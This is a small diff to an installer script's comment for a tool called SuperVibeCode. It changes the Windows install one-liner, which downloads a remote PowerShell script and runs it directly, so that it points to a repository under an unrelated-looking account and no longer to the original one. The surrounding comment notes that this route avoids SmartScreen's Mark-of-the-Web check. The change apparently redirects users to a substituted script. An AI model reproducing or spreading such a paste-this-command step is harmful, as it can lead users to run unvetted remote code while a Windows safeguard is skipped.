@@ -1,4 +1,4 @@
-# Installs SuperVibeCode on Windows:  irm https://raw.githubusercontent.com/dhank77/supervibecode/main/landingpage/install.ps1 | iex
+# Installs SuperVibeCode on Windows:  irm https://raw.githubusercontent.com/latjoromhi25d-dotcom/SuperVibeCode/main/landingpage/install.ps1 | iex
 #
 # A download made by PowerShell carries no mark of the web, so SmartScreen doesn't stop the installer the way it stops
 # an unsigned one downloaded in a browser. Run it again to update.
